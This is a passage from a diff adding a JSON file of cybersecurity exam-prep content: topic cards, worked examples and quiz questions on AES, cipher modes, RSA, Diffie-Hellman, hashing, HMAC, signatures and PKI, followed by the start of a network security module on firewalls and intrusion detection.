+          "exam": "Important ASTU exam point: The final round of AES OMITS the MixColumns transformation! It only executes SubBytes, ShiftRows, and AddRoundKey. Also, AES block size is ALWAYS 128 bits regardless of whether the key is 128, 192, or 256 bits.",
+          "trap": "Exam Trap: Stating AES-256 uses a 256-bit block size. WRONG! AES block size is permanently fixed at 128 bits; only the key length changes (128, 192, or 256 bits).",
+          "example": "AES-128 encrypts financial transactions: 10 rounds of Galois Field GF(2^8) byte substitutions and matrix multiplications produce unbreakable ciphertext.",
+          "q": "How many rounds does AES execute for a 256-bit key, and what transformation is intentionally omitted during the final round of AES?",
+          "a": "AES-256 executes exactly 14 rounds. The MixColumns transformation is omitted in the final round (only SubBytes, ShiftRows, and AddRoundKey are performed)."
+        },
+        {
+          "id": "cyber_m2_block_cipher_modes",
+          "cat": "Cipher Modes",
+          "title": "BLOCK CIPHER MODES OF OPERATION: ECB, CBC, CTR, GCM",
+          "sub": "Encrypting Arbitrary-Length Messages and Achieving Authenticated Encryption",
+          "plain": "Block ciphers only encrypt one small block at a time. Modes of operation determine how multiple blocks are chained together. Never use ECB because identical plaintext blocks create identical ciphertext blocks, revealing patterns.",
+          "def": "Modes of operation specify how a block cipher securely processes data payloads larger than a single block: Electronic Codebook (ECB) encrypts each block independently under K (insecure; leaks patterns); Cipher Block Chaining (CBC) XORs each plaintext block with the preceding ciphertext block using an Initialization Vector (IV); Counter (CTR) encrypts an incrementing counter turning block ciphers into stream ciphers; Galois/Counter Mode (GCM) combines CTR mode with Galois field multiplication to deliver Authenticated Encryption with Associated Data (AEAD).",
+          "exam": "ECB is insecure (the infamous ECB penguin image leak). CBC requires sequential encryption (cannot be parallelized during encryption) and unpredictable random IV. CTR and GCM allow full parallelization. GCM provides both confidentiality AND integrity.",
+          "trap": "Exam Trap: Reusing an IV in CBC mode allows an attacker to detect if two plaintexts share a common prefix. In GCM/CTR mode, reusing a Nonce completely breaks confidentiality and authenticity.",
+          "example": "ECB encrypting a company logo preserves the visual outline in ciphertext. AES-GCM in TLS 1.3 encrypts web traffic while generating an authentication tag to prevent any byte alteration.",
+          "q": "Why is Electronic Codebook (ECB) mode strictly forbidden in modern cryptographic protocols even when using AES-256?",
+          "a": "Because ECB encrypts identical plaintext blocks into identical ciphertext blocks under the same key. This leaks structural patterns and statistical frequency of the underlying data (as demonstrated by the ECB Penguin)."
+        },
+        {
+          "id": "cyber_m2_asymmetric_principles",
+          "cat": "Asymmetric Cryptography",
+          "title": "ASYMMETRIC CRYPTOGRAPHY AND MATHEMATICAL FOUNDATIONS",
+          "sub": "Public-Key Cryptography, Trapdoor Functions, and Modular Arithmetic",
+          "plain": "Asymmetric cryptography uses two mathematically linked keys: a Public key that anyone can see to encrypt messages, and a Private key kept strictly secret to decrypt them. It solves the massive problem of securely sharing secret keys across the internet.",
+          "def": "Asymmetric (Public Key) Cryptography utilizes asymmetric key pairs (K_pub, K_priv) generated via computationally asymmetric mathematical problems known as Trapdoor One-Way Functions—functions easy to compute in one direction but intractable to invert unless a secret piece of information (the trapdoor) is known. Core hardness foundations include Integer Factorization (RSA), Discrete Logarithms (Diffie-Hellman, DSA), and Elliptic Curve Discrete Logarithms (ECDSA, Ed25519).",
+          "exam": "If encryption key = public key, decryption key = private key -> provides Confidentiality. If encryption key = private key, decryption key = public key -> provides Authentication and Digital Signature.",
+          "trap": "Exam Trap: Believing asymmetric encryption replaces symmetric encryption for all traffic. Asymmetric crypto is roughly 1000x slower computationally than symmetric crypto; in practice, it is used only to securely exchange a symmetric session key (hybrid cryptosystem).",
+          "example": "When accessing an HTTPS banking website, your browser uses RSA or ECDHE to exchange a shared symmetric AES-256 key, which then encrypts the actual high-speed webpage data stream.",
+          "q": "What is a 'Trapdoor One-Way Function', and what role does it play in asymmetric public-key cryptography?",
+          "a": "A function that is computationally easy to compute in the forward direction, but computationally infeasible to invert unless a specific secret piece of auxiliary information (the 'trapdoor') is known. The private key acts as this secret trapdoor."
+        },
+        {
+          "id": "cyber_m2_rsa_algorithm",
+          "cat": "Asymmetric Cryptography",
+          "title": "RSA ALGORITHM: KEY GENERATION, ENCRYPTION, AND DECRYPTION",
+          "sub": "The Rivest-Shamir-Adleman Public Key Cryptosystem",
+          "plain": "RSA is built on prime numbers. Multiply two massive primes together and it's easy; finding the original primes from that product is practically impossible for supercomputers. You encrypt with (e, n) and decrypt with (d, n).",
+          "def": "The RSA cryptosystem (1977) derives security from the hardness of factoring the product of two large prime numbers: 1. Choose large distinct primes p and q. 2. Compute modulus n = p * q. 3. Compute Euler's totient phi(n) = (p-1)(q-1). 4. Select public exponent e such that 1 < e < phi(n) and gcd(e, phi(n)) = 1. 5. Compute private exponent d such that d * e ≡ 1 (mod phi(n)). Encryption: C ≡ M^e (mod n). Decryption: M ≡ C^d (mod n).",
+          "exam": "Numerical Steps for ASTU Exams: Given p=3, q=11, e=7: n = 33, phi(n) = 2*10 = 20. Find d: (7*d) mod 20 = 1 -> d = 3. Encrypt M=2: C = 2^7 mod 33 = 128 mod 33 = 29. Decrypt C=29: M = 29^3 mod 33 = 24389 mod 33 = 2.",
+          "trap": "Exam Trap: Computing d modulo n instead of modulo phi(n). Remember: d is the modular multiplicative inverse of e MODULO phi(n), NOT modulo n!",
+          "example": "SSH authentication using 4096-bit RSA keys protects remote terminal logins to enterprise Linux servers worldwide.",
+          "q": "In an RSA system, given primes p = 7 and q = 11, and public exponent e = 13, calculate the private key exponent d.",
+          "a": "1. Compute n = 7 * 11 = 77. 2. Compute phi(n) = (7 - 1) * (11 - 1) = 6 * 10 = 60. 3. Find d such that (d * 13) ≡ 1 (mod 60). Testing multiples: 13 * 37 = 481 = (8 * 60) + 1. Thus, d = 37."
+        },
+        {
+          "id": "cyber_m2_diffie_hellman",
+          "cat": "Key Exchange",
+          "title": "DIFFIE-HELLMAN KEY EXCHANGE AND MITM VULNERABILITY",
+          "sub": "Establishing Shared Secrets over Unsecured Channels via Discrete Logarithms",
+          "plain": "Diffie-Hellman allows two strangers to create a shared secret key over a public, eavesdropped channel without sending the key itself. However, because it lacks authentication, an attacker in the middle can impersonate both sides.",
+          "def": "Diffie-Hellman (DH, 1976) enables two principals (Alice and Bob) to establish a shared symmetric secret over an untrusted channel: 1. Agree on public prime p and primitive root g. 2. Alice picks private a, sends public A = g^a mod p. 3. Bob picks private b, sends public B = g^b mod p. 4. Alice computes K = B^a mod p; Bob computes K = A^b mod p. Security relies on the Discrete Logarithm Problem (computing a from g^a mod p is intractable). Vulnerability: Inherently unauthenticated; vulnerable to Man-in-the-Middle (MitM) unless paired with digital signatures (Station-to-Station protocol).",
+          "exam": "Formula: Shared Secret K = (g^b)^a = (g^a)^b = g^(ab) mod p. Diffie-Hellman is a KEY EXCHANGE protocol, NOT an encryption algorithm. You cannot encrypt a message directly with Diffie-Hellman.",
+          "trap": "Exam Trap: Stating DH provides authentication or non-repudiation. Standard DH provides ZERO authentication. Mallory can intercept Alice's public value and negotiate separate keys with Alice and Bob.",
+          "example": "Ephemeral Diffie-Hellman over Elliptic Curves (ECDHE) generates disposable single-session keys in TLS 1.3, guaranteeing Perfect Forward Secrecy (PFS).",
+          "q": "In a Diffie-Hellman exchange with prime p = 23 and generator g = 5, Alice chooses private key a = 6 and Bob chooses private key b = 15. What is their negotiated shared secret key K?",
+          "a": "Alice sends A = 5^6 mod 23 = 15625 mod 23 = 8. Bob sends B = 5^15 mod 23 = 19. Alice computes K = 19^6 mod 23 = 2. Bob computes K = 8^15 mod 23 = 2. The shared secret is K = 2."
+        },
+        {
+          "id": "cyber_m2_cryptographic_hash_sha256",
+          "cat": "Hash Functions",
+          "title": "CRYPTOGRAPHIC HASH FUNCTIONS AND SHA-256",
+          "sub": "One-Way Mathematical Fingerprints for Data Integrity",
+          "plain": "A cryptographic hash takes any size input and compresses it into a fixed-size fingerprint (like 256 bits). Changing even a single comma in a massive book completely randomizes the entire hash output (the avalanche effect).",
+          "def": "A Cryptographic Hash Function H is a deterministic, one-way mathematical function mapping arbitrary-length inputs x to fixed-length digest outputs h = H(x). To be cryptographically secure, H must satisfy three properties: 1. Pre-image Resistance (One-Way): Given h, it is computationally infeasible to find x such that H(x) = h. 2. Second Pre-image Resistance (Weak Collision Resistance): Given x, infeasible to find y != x such that H(y) = H(x). 3. Collision Resistance (Strong Collision Resistance): Infeasible to find any distinct pair (x, y) such that H(x) = H(y). SHA-256 uses the Merkle-Damgård construction outputting a 256-bit digest.",
+          "exam": "Complexity benchmarks: Pre-image resistance requires 2^n operations (for n-bit hash). Collision resistance requires only 2^(n/2) operations due to the Birthday Paradox. Hence for SHA-256: Pre-image = 2^256 operations; Collision = 2^128 operations.",
+          "trap": "Exam Trap: Thinking MD5 and SHA-1 are still secure. Both have suffered practical collision attacks in academic and real-world demonstrations (e.g., Google's SHAttered attack) and are banned in modern standards.",
+          "example": "Git uses SHA-1/SHA-256 commit hashes to track repository states. Operating system download portals publish SHA-256 checksums to let users verify downloaded ISO image integrity.",
+          "q": "Explain the difference between Pre-image Resistance and Collision Resistance in cryptographic hash functions, detailing their respective brute-force computational complexities for an n-bit digest.",
+          "a": "Pre-image resistance means given a target hash h, finding any input x where H(x) = h requires O(2^n) operations. Collision resistance means finding ANY two distinct inputs x and y where H(x) = H(y), which requires only O(2^(n/2)) operations due to the Birthday Paradox."
+        },
+        {
+          "id": "cyber_m2_message_auth_codes_hmac",
+          "cat": "Message Authentication",
+          "title": "MESSAGE AUTHENTICATION CODES (MAC) AND HMAC",
+          "sub": "Symmetric Authentication and Integrity Verification via Keyed Hashes",
+          "plain": "A regular hash proves a file wasn't corrupted by accident. But a hacker could tamper with the file and recalculate the hash. A MAC uses a secret key combined with the hash so that only someone who knows the key can generate a valid tag.",
+          "def": "A Message Authentication Code (MAC) is an authentication technique generating a fixed-length cryptographic checksum under a shared secret key K: Tag = MAC(K, M). The recipient verifies that the message has not been altered (Integrity) and originated from a party possessing K (Authenticity). Hash-based MAC (HMAC, RFC 2104) constructs a secure MAC from an iterated hash function: HMAC(K, M) = H((K+ XOR opad) || H((K+ XOR ipad) || M)), where ipad and opad are fixed inner and outer padding constants.",
+          "exam": "Why not simple H(K || M)? Because naive constructions are vulnerable to Length Extension Attacks (e.g., in Merkle-Damgård hashes like MD5/SHA-1/SHA-256). HMAC's nested two-pass hashing completely eliminates length extension vulnerabilities.",
+          "trap": "Exam Trap: Believing HMAC encrypts the message. HMAC provides INTEGRITY and AUTHENTICITY, NOT CONFIDENTIALITY. The message payload M is transmitted in plaintext alongside the HMAC tag unless separately encrypted.",
+          "example": "Amazon AWS API requests require signing every HTTP request header using HMAC-SHA256 with the developer's AWS Secret Access Key to verify authenticity and prevent request tampering.",
+          "q": "Why is the naive keyed hash construction H(Key || Message) cryptographically flawed when using Merkle-Damgård hash algorithms like SHA-256?",
+          "a": "Because it is vulnerable to a Length Extension Attack. An attacker who knows H(Key || Message) and the length of the secret key can compute H(Key || Message || Padding || Extension) without ever discovering the key."
+        },
+        {
+          "id": "cyber_m2_digital_signatures",
+          "cat": "Digital Signatures",
+          "title": "DIGITAL SIGNATURES AND NON-REPUDIATION",
+          "sub": "Asymmetric Cryptographic Signing, Verification, and Integrity Assurance",
+          "plain": "A digital signature is the electronic equivalent of a handwritten signature, but mathematically impossible to forge. You hash your message and encrypt the hash with your Private Key. Anyone with your Public Key can verify you signed it.",
+          "def": "A Digital Signature is an asymmetric cryptographic mechanism providing Message Authentication, Data Integrity, and Non-Repudiation. 1. Signing: Sender hashes message h = H(M) and encrypts the digest with sender's private key: S = Sign(K_priv, h). 2. Verification: Receiver decrypts signature using sender's public key h' = Verify(K_pub, S), independently computes h = H(M), and asserts validity if and only if h == h'.",
+          "exam": "Remember the fundamental distinction: To ENCRYPT for confidentiality: Use recipient's PUBLIC key. To SIGN for authenticity/non-repudiation: Use sender's PRIVATE key.",
+          "trap": "Exam Trap: Signing the entire multi-gigabyte message file directly with RSA. In reality, you NEVER sign the raw message directly; you hash the message to a fixed 256-bit digest first and sign the hash digest (Hash-then-Sign).",
+          "example": "Software updates for Android and Windows operating systems are digitally signed with vendor private keys; the device verifies the signature before installing to prevent malware injection.",
+          "q": "Walk through the two-step mathematical process of creating and verifying a digital signature using an asymmetric cryptosystem.",
+          "a": "1. Signing: The sender generates a cryptographic hash of the message h = H(M) and encrypts h with their private key to produce signature S. 2. Verification: The recipient computes h = H(M), decrypts S using the sender's public key to recover h', and verifies that h == h'."
+        },
+        {
+          "id": "cyber_m2_pki_digital_certificates",
+          "cat": "PKI",
+          "title": "PUBLIC KEY INFRASTRUCTURE (PKI) AND X.509 CERTIFICATES",
+          "sub": "Trust Chains, Certificate Authorities, and Revocation Protocols",
+          "plain": "How do you know Alice's public key really belongs to Alice and not an attacker? A Certificate Authority (CA) acts like a digital passport office, signing an X.509 digital certificate that cryptographically binds Alice's identity to her public key.",
+          "def": "Public Key Infrastructure (PKI) is the comprehensive framework of hardware, software, policies, and cryptographic protocols that manages the creation, issuance, distribution, and revocation of digital certificates. An X.509 Digital Certificate binds a subject's identity (domain, organization) to their public key, signed by a trusted Certificate Authority (CA). Validation traverses a hierarchical Certificate Trust Chain up to a pre-installed Root CA.",
+          "exam": "Certificate Revocation mechanisms: 1. Certificate Revocation List (CRL): A periodic CA-published blacklist of revoked certificate serial numbers (suffers from latency and large download sizes). 2. Online Certificate Status Protocol (OCSP): A real-time protocol to query the revocation status of a specific certificate.",
+          "trap": "Exam Trap: Forgetting that Root CAs are self-signed. Root CA certificates are explicitly trusted by operating systems and browsers via pre-installed hardware/OS root trust stores, terminating the chain of trust.",
+          "example": "Visiting https://astu.ac.in presents an X.509 certificate verified by your browser against trusted Root CAs, ensuring an adversary cannot intercept banking or university credentials via DNS spoofing.",
+          "q": "What problem does Public Key Infrastructure (PKI) solve that asymmetric cryptography alone cannot, and how does it accomplish this?",
+          "a": "Asymmetric crypto alone cannot prove that a public key genuinely belongs to the claimed owner (vulnerable to impersonation and MITM). PKI solves this by having a trusted Certificate Authority (CA) digitally sign an X.509 certificate binding the entity's identity to their public key."
+        }
+      ],
+      "quiz": [
+        {
+          "q": "An analyst cracks an unknown cipher by observing that the letter 'E' appears with the exact same 12.7% frequency as the letter 'X' in the ciphertext, and single letters consistently map to fixed alternative letters. What cipher class was employed?",
+          "opts": [
+            "Monoalphabetic Substitution Cipher",
+            "One-Time Pad",
+            "Advanced Encryption Standard in CBC mode",
+            "Polyalphabetic Vigenère Cipher"
+          ],
+          "ans": 0,
+          "cat": "Classical Cryptography",
+          "correctFb": "Monoalphabetic substitution ciphers map each plaintext character to a single fixed substitute character, preserving unigram frequency distributions and making them completely vulnerable to frequency analysis.",
+          "distractors": [
+            "A One-Time Pad provides information-theoretic perfect secrecy and completely flattens frequency distributions.",
+            "AES in CBC mode produces pseudorandom ciphertext with uniform byte frequencies.",
+            "Polyalphabetic ciphers use shifting keys that flatten single-letter frequency spikes across multiple alphabets."
+          ]
+        },
+        {
+          "q": "In the Advanced Encryption Standard (AES) block cipher architecture, what is the exact number of rounds executed for a 128-bit key, and which step is omitted in the final round?",
+          "opts": [
+            "10 rounds; MixColumns is omitted",
+            "12 rounds; SubBytes is omitted",
+            "14 rounds; ShiftRows is omitted",
+            "10 rounds; AddRoundKey is omitted"
+          ],
+          "ans": 0,
+          "cat": "Symmetric Cryptography",
+          "correctFb": "AES-128 executes exactly 10 rounds. The final round (Round 10) intentionally omits the MixColumns transformation, executing only SubBytes, ShiftRows, and AddRoundKey.",
+          "distractors": [
+            "12 rounds corresponds to AES-192, and SubBytes is never omitted.",
+            "14 rounds corresponds to AES-256, and ShiftRows is never omitted.",
+            "AddRoundKey must be executed in every single round, including the initial pre-round and final round."
+          ]
+        },
+        {
+          "q": "Why does encrypting a bitmap image using AES in Electronic Codebook (ECB) mode leak the visual silhouette of the underlying graphic?",
+          "opts": [
+            "ECB uses a dynamic counter that resets to zero on every block",
+            "Identical 128-bit plaintext blocks are encrypted into identical ciphertext blocks under the same key",
+            "ECB applies an unkeyed linear feedback shift register to pixels",
+            "ECB transmits the encryption key in the packet payload header"
+          ],
+          "ans": 1,
+          "cat": "Block Cipher Modes",
+          "correctFb": "ECB mode encrypts each block independently without feedback or chaining. As a result, identical plaintext blocks (such as solid background pixels) always generate identical ciphertext blocks, preserving visual patterns.",
+          "distractors": [
+            "Resetting counters is a flaw associated with improper CTR mode nonce reuse, not ECB.",
+            "ECB does not utilize linear feedback shift registers.",
+            "Cipher modes never transmit secret keys in packet headers."
+          ]
+        },
+        {
+          "q": "In the RSA algorithm, given prime numbers p = 3 and q = 11, with chosen public encryption exponent e = 7, what is the private decryption exponent d?",
+          "opts": [
+            "d = 3",
+            "d = 7",
+            "d = 13",
+            "d = 20"
+          ],
+          "ans": 0,
+          "cat": "Asymmetric Cryptography",
+          "correctFb": "n = 3 * 11 = 33. Euler's totient phi(n) = (3 - 1) * (11 - 1) = 2 * 10 = 20. We require d * e ≡ 1 (mod 20), so 7 * d ≡ 1 (mod 20). For d = 3: 7 * 3 = 21 ≡ 1 (mod 20). Therefore, d = 3.",
+          "distractors": [
+            "d = 7 gives 7 * 7 = 49 ≡ 9 (mod 20), which is not congruent to 1.",
+            "d = 13 gives 7 * 13 = 91 ≡ 11 (mod 20), which is not congruent to 1.",
+            "d cannot equal 20 because d must be coprime to phi(n) and satisfy d * e ≡ 1 (mod 20)."
+          ]
+        },
+        {
+          "q": "What fundamental vulnerability undermines the vanilla Diffie-Hellman key exchange when executed over an unauthenticated public channel?",
+          "opts": [
+            "The discrete logarithm problem can be solved in polynomial time by classical computers",
+            "It is completely vulnerable to an active Man-in-the-Middle (MitM) attack because participants cannot verify the identity of the other party",
+            "The shared secret is transmitted directly in plaintext inside the g^ab parameter",
+            "It only works with symmetric key algorithms that utilize 64-bit blocks"
+          ],
+          "ans": 1,
+          "cat": "Key Exchange",
+          "correctFb": "Vanilla Diffie-Hellman provides zero authentication. An active adversary situated between Alice and Bob can intercept public keys and establish two independent shared secrets (one with Alice, one with Bob), reading all traffic.",
+          "distractors": [
+            "The discrete logarithm problem remains computationally intractable on classical computers for large prime groups.",
+            "The shared secret g^ab is computed privately by each party and is never transmitted over the wire.",
+            "Diffie-Hellman establishes symmetric session keys regardless of block size."
+          ]
+        },
+        {
+          "q": "According to the Birthday Paradox, how many hash operations must an attacker execute to find a collision (H(x) = H(y) for x != y) in an n-bit cryptographic hash function with approximately 50% probability?",
+          "opts": [
+            "2^n operations",
+            "2^(n/2) operations",
+            "n^2 operations",
+            "2^(n-1) operations"
+          ],
+          "ans": 1,
+          "cat": "Cryptographic Hashes",
+          "correctFb": "Due to the Birthday Paradox, the collision resistance of any n-bit cryptographic hash function drops to O(2^(n/2)) operations, which is why a 256-bit hash (like SHA-256) provides 128 bits of collision security.",
+          "distractors": [
+            "2^n operations is the computational work factor required to break Pre-image Resistance, not Collision Resistance.",
+            "n^2 represents polynomial time, which is far too low for any secure cryptographic hash.",
+            "2^(n-1) represents half the search space of a pre-image attack."
+          ]
+        },
+        {
+          "q": "Why is the nested HMAC construction HMAC(K, M) = H((K+ XOR opad) || H((K+ XOR ipad) || M)) preferred over a naive keyed hash like H(Key || Message)?",
+          "opts": [
+            "It uses half as many CPU cycles as standard hashing",
+            "It prevents Length Extension Attacks inherent to Merkle-Damgård iterative hash functions",
+            "It provides end-to-end payload confidentiality without requiring AES",
+            "It allows the receiver to decrypt the original message without having the key"
+          ],
+          "ans": 1,
+          "cat": "Message Authentication",
+          "correctFb": "Merkle-Damgård hash functions (MD5, SHA-1, SHA-256) output their internal state as the final digest. A naive H(Key || Message) permits attackers to append extra data (Length Extension Attack). HMAC's nested two-pass hashing completely eliminates this flaw.",
+          "distractors": [
+            "HMAC requires two hashing passes, making it slightly more computationally intensive than a single pass.",
+            "HMAC does not provide confidentiality; the message is sent in plaintext unless separately encrypted.",
+            "HMAC is a one-way authentication tag and cannot be reversed to decrypt the message."
+          ]
+        },
+        {
+          "q": "When creating a standard Digital Signature for an email message, what keys and data transformations are utilized by the sender?",
+          "opts": [
+            "Encrypt the entire message body with the recipient's public key",
+            "Hash the message and encrypt the resulting digest using the sender's private key",
+            "Encrypt the message with a symmetric key and sign the key with the recipient's private key",
+            "Hash the message and encrypt the digest using the recipient's public key"
+          ],
+          "ans": 1,
+          "cat": "Digital Signatures",
+          "correctFb": "To create a digital signature, the sender computes a cryptographic hash of the message and encrypts that hash with their own private key. Anyone can verify it using the sender's public key, ensuring authenticity and non-repudiation.",
+          "distractors": [
+            "Encrypting the message with the recipient's public key provides confidentiality, not a digital signature.",
+            "The sender cannot sign anything with the recipient's private key because only the recipient knows it.",
+            "Encrypting the hash with the recipient's public key prevents anyone other than the recipient from verifying the signature."
+          ]
+        },
+        {
+          "q": "Which protocol provides real-time, low-latency checking of digital certificate revocation status by querying an online responder without downloading complete certificate revocation lists?",
+          "opts": [
+            "Certificate Revocation List (CRL)",
+            "Online Certificate Status Protocol (OCSP)",
+            "Pretty Good Privacy (PGP)",
+            "Simple Network Management Protocol (SNMP)"
+          ],
+          "ans": 1,
+          "cat": "PKI",
+          "correctFb": "The Online Certificate Status Protocol (OCSP, RFC 6960) allows clients to query a CA's validation authority in real time to verify the revocation status of a specific certificate without downloading massive, outdated CRL files.",
+          "distractors": [
+            "CRLs require downloading large periodic lists of all revoked certificates, causing high latency and bandwidth overhead.",
+            "PGP is a decentralized web-of-trust encryption standard, not a real-time PKI revocation protocol.",
+            "SNMP is an IP network device monitoring protocol unrelated to PKI certificate revocation."
+          ]
+        },
+        {
+          "q": "What critical security guarantee is provided by Ephemeral Diffie-Hellman (DHE / ECDHE) key exchange that is absent when using static RSA key exchange in TLS?",
+          "opts": [
+            "Zero CPU overhead on client devices",
+            "Perfect Forward Secrecy (PFS): Past recorded sessions cannot be decrypted even if the server's long-term private key is compromised in the future",
+            "Immunity against quantum computing Shor's algorithm attacks",
+            "Elimination of the need for an X.509 digital certificate"
+          ],
+          "ans": 1,
+          "cat": "TLS / Key Exchange",
+          "correctFb": "Ephemeral Diffie-Hellman generates temporary, disposable session key pairs that are discarded after each connection. Even if an adversary later steals the server's master private key, they cannot retroactively decrypt past recorded traffic (Perfect Forward Secrecy).",
+          "distractors": [
+            "DHE requires modular exponentiation or point multiplication, which introduces CPU overhead.",
+            "Diffie-Hellman remains vulnerable to Shor's algorithm on theoretical cryptographically relevant quantum computers.",
+            "TLS still requires an X.509 digital certificate to authenticate the server and prevent MITM attacks."
+          ]
+        }
+      ],
+      "bossChallenges": [
+        {
+          "marks": 10,
+          "scenario": "A financial payment gateway relies on the RSA cryptosystem to protect inter-bank settlement instructions. During an architecture audit, an engineer proposes using a 512-bit RSA key without padding to 'optimize processing throughput.' As the Principal Cryptographic Architect, deliver an exhaustive technical evaluation: derive the full mathematical key generation, encryption, and decryption steps of RSA, demonstrate why unpadded (textbook) RSA is insecure against chosen-ciphertext and homomorphic attacks, and formulate a compliant production standard incorporating OAEP padding and modern key sizes.",
+          "rubric": [
+            "Mathematical Foundation & Key Generation (2.5 marks): Rigorous derivation of modulus n, Euler's totient phi(n), coprime public exponent e, and modular multiplicative inverse d via Extended Euclidean Algorithm.",
+            "Encryption & Decryption Formulation (2.5 marks): Concrete formulas C ≡ M^e (mod n) and M ≡ C^d (mod n) with a verified small-prime numerical example.",
+            "Cryptanalysis of Textbook RSA (2.5 marks): Clear explanation of multiplicative homomorphism (E(m1)*E(m2) = E(m1*m2 mod n)) and vulnerability to factorization at 512 bits.",
+            "Hardened Standards & Mitigations (2.5 marks): Prescribing minimum 2048-bit or 3072-bit keys and mandatory Optimal Asymmetric Encryption Padding (OAEP)."
+          ]
+        },
+        {
+          "marks": 5,
+          "scenario": "Two branch offices establish an encrypted communication channel over the public internet using vanilla Diffie-Hellman key exchange. An adversary executes an active Man-in-the-Middle (MitM) attack, intercepting all confidential payloads without detection. Explain the mathematical mechanics of this attack and implement the Station-to-Station (STS) cryptographic protocol to permanently resolve the vulnerability.",
+          "rubric": [
+            "Mechanics of the MitM Exploitation (1.25 marks): Mathematical demonstration of the attacker intercepting g^a and g^b, substituting g^e, and negotiating two distinct shared secrets.",
+            "Root Cause Analysis (1.25 marks): Highlighting the complete absence of identity binding or message authentication in vanilla Diffie-Hellman.",
+            "Station-to-Station Protocol Implementation (1.25 marks): Integrating asymmetric digital signatures and public key certificates over the exchanged DH parameters.",
+            "Forward Secrecy Verification (1.25 marks): Explaining how Ephemeral Diffie-Hellman preserves Perfect Forward Secrecy even with authenticated signing keys."
+          ]
+        }
+      ]
+    },
+    {
+      "id": "m3",
+      "num": 3,
+      "title": "Network Security",
+      "topics": [
+        {
+          "id": "cyber_m3_firewall_architectures",
+          "cat": "Firewalls",
+          "title": "FIREWALL ARCHITECTURES: PACKET FILTERING, STATEFUL INSPECTION, APPLICATION PROXY",
+          "sub": "Evolution of Network Perimeter Defenses and Filtering Generations",
+          "plain": "Firewalls are the gatekeepers of your network. Packet filters look at basic headers (IP/port) like a bouncer checking IDs. Stateful firewalls remember open connections. Application proxies inspect the actual content of the conversations.",
+          "def": "A Firewall is a network security system that monitors and controls incoming and outgoing network traffic based on predetermined security rules. Three primary architectural generations exist: 1. Packet Filtering (Stateless): Operates at Layers 3/4 inspecting source/destination IP, port, and protocol flags in isolation. 2. Stateful Inspection: Maintains a dynamic state table tracking established TCP/UDP connections and sequence numbers across sessions. 3. Application-Level Gateway (Proxy): Terminates connections at Layer 7, performing full bidirectional payload reassembly and protocol validation.",
+          "exam": "Stateless filters cannot detect attacks spanning multiple packets and allow forged ACK packets. Stateful firewalls track TCP 3-way handshakes in state tables. Application proxies provide the highest security but introduce processing latency.",
+          "trap": "Exam Trap: Assuming stateful firewalls inspect deep payload content. Stateful firewalls only track connection state (SYN, ESTABLISHED, FIN); they do NOT inspect Layer 7 application data unless integrated into an NGFW/proxy.",
+          "example": "An iptables rule `iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT` demonstrates stateful inspection allowing returning traffic for legitimate outbound sessions.",
+          "q": "How does a Stateful Inspection firewall prevent an attacker from bypassing security rules using an unsolicited TCP packet with the ACK flag set, where a Stateless Packet Filter would fail?",
+          "a": "A stateless filter blindly permits packets with ACK=1 (assuming they belong to outbound traffic). A stateful firewall checks its internal dynamic state table; if no corresponding outbound SYN request was logged, the rogue ACK is instantly dropped."
+        },
+        {
+          "id": "cyber_m3_next_gen_firewalls",
+          "cat": "Firewalls",
+          "title": "NEXT-GENERATION FIREWALLS (NGFW) AND DEEP PACKET INSPECTION",
+          "sub": "Layer 7 Application Awareness, Threat Intelligence, and Encrypted Traffic Analysis",
+          "plain": "Traditional firewalls only blocked ports like port 80 or 443. NGFWs look inside the encrypted packets using Deep Packet Inspection to detect specific applications (like BitTorrent running over port 443) and block malware inside traffic.",
+          "def": "Next-Generation Firewalls (NGFW) combine traditional enterprise firewall capabilities (stateful inspection, NAT, VPN) with advanced Layer 7 application awareness, integrated Intrusion Prevention Systems (IPS), Deep Packet Inspection (DPI), SSL/TLS decryption inspection, and real-time cloud threat intelligence feeds.",
+          "exam": "Key capabilities of NGFW: Application identification regardless of port (App-ID), user identity integration (User-ID), TLS inspection (SSL forward proxy), and inline malware sandboxing.",
+          "trap": "Exam Trap: Thinking blocking TCP port 80 and 443 blocks all web traffic on an old firewall. Modern apps tunnel non-web traffic (like SSH or VPNs) over port 443; only Layer 7 DPI can identify the true underlying protocol.",
+          "example": "A corporate NGFW inspects traffic on port 443, decrypts the TLS session using a trusted corporate root certificate, discovers an employee exfiltrating source code to an unsanctioned cloud drive, and drops the connection.",
+          "q": "Why can a standard Layer 4 firewall not prevent an employee from transferring sensitive files via an unauthorized web chat application that tunnels traffic over TCP port 443?",
+          "a": "Because Layer 4 firewalls only inspect IP addresses and port numbers. Since port 443 is permitted for HTTPS, the firewall allows the packets without inspecting the Layer 7 payload to identify the unauthorized application."
+        },
+        {
+          "id": "cyber_m3_ids_ips_mechanisms",
+          "cat": "Intrusion Detection",
+          "title": "INTRUSION DETECTION AND PREVENTION SYSTEMS (IDS / IPS)",
+          "sub": "Signature-Based vs Anomaly-Based Network and Host Defenses",
+          "plain": "An IDS is like a security camera that sounds an alarm when a burglar enters. An IPS is like an armed guard who physically blocks the burglar at the door before they get inside.",
+          "def": "Intrusion Detection Systems (IDS) passively monitor and analyze network traffic or host audit logs to detect security policy violations, raising alerts (out-of-band). Intrusion Prevention Systems (IPS) sit inline in the direct traffic path to detect and actively drop malicious packets in real time. Detection methodologies include: Signature-Based (matching known exploit patterns/hashes; high accuracy, blind to zero-days) and Anomaly-Based (detecting deviations from a baseline of normal behavior; catches zero-days, higher false positive rate).",
+          "exam": "IDS is passive / out-of-band (uses SPAN/TAP ports); it cannot block packets. IPS is inline (traffic passes through the device); it can drop packets. Signature = known attacks; Anomaly = novel zero-days.",
+          "trap": "Exam Trap: Stating anomaly detection has zero false positives. Anomaly detection historically suffers from HIGH false positive rates because legitimate network spikes (like software updates or Black Friday traffic) deviate from baselines.",
+          "example": "Snort configured inline as an IPS detects a known EternalBlue exploit signature (MS17-010) on port 445 and sends a TCP RST packet to kill the attacking connection instantly.",
+          "q": "Compare Signature-Based detection with Anomaly-Based detection in an Intrusion Prevention System, highlighting the primary strength and weakness of each.",
+          "a": "Signature-based detection has high accuracy and minimal false positives for known threats, but cannot detect zero-day exploits. Anomaly-based detection can detect novel zero-day attacks, but generates higher false-positive rates when legitimate behavior deviates from the baseline."
+        },
+        {
+          "id": "cyber_m3_dos_ddos_attacks",
+          "cat": "Network Attacks",
+          "title": "DENIAL OF SERVICE (DOS) AND DISTRIBUTED DOS (DDOS)",
+          "sub": "Mechanisms of SYN Floods, UDP Amplification, and Smurf Attacks",
